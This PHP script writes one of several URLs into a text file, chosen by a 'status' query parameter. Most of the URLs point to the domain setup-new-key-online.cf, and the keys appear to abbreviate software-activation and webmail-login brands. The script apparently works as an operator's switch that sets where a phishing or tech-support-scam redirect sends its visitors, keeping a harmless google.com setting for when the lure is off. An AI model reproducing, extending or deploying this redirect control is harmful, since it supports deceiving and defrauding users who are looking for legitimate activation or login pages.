<?php 

if(!empty($_GET['status']))
{
    $param = $_GET['status'];
    if($param == "website")
    {
        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
        $txt = "https://www.google.com/";
        fwrite($myfile, $txt);
        fclose($myfile);
    }
    elseif($param == "actnor")
    {
        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
        $txt = "https://setup-new-key-online.cf/actnor/";
        fwrite($myfile, $txt);
        fclose($myfile); 
    }
    elseif($param == "actmca")
    {
        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
        $txt = "https://setup-new-key-online.cf/actmca/";
        fwrite($myfile, $txt);
        fclose($myfile); 
    }
    elseif($param == "actoff")
    {
        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
        $txt = "https://setup-new-key-online.cf/actoff/setup_in.php";
        fwrite($myfile, $txt);
        fclose($myfile); 
    }
    elseif($param == "actyou")
    {
        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
        $txt = "https://setup-new-key-online.cf/actyou/";
        fwrite($myfile, $txt);
        fclose($myfile); 
    }
    elseif($param == "actrok")
    {
        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
        $txt = "";
        fwrite($myfile, $txt);
        fclose($myfile); 
    }
    elseif($param == "logtel")
    {
        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
        $txt = "";
        fwrite($myfile, $txt);
        fclose($myfile); 
    }
    elseif($param == "logpog")
    {
        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
        $txt = "";
        fwrite($myfile, $txt);
        fclose($myfile); 
    }
    elseif($param == "logaol")
    {
        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
        $txt = "";
        fwrite($myfile, $txt);
        fclose($myfile); 
    }
    elseif($param == "mx")
    {
        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
        $txt = "";
        fwrite($myfile, $txt);
        fclose($myfile); 
    }
    elseif($param == "actweb")
    {
        $myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
        $txt = "";
        fwrite($myfile, $txt);
        fclose($myfile); 
    }
    else{
        echo "error";
    }
}
else{
    echo "error";
}

?>
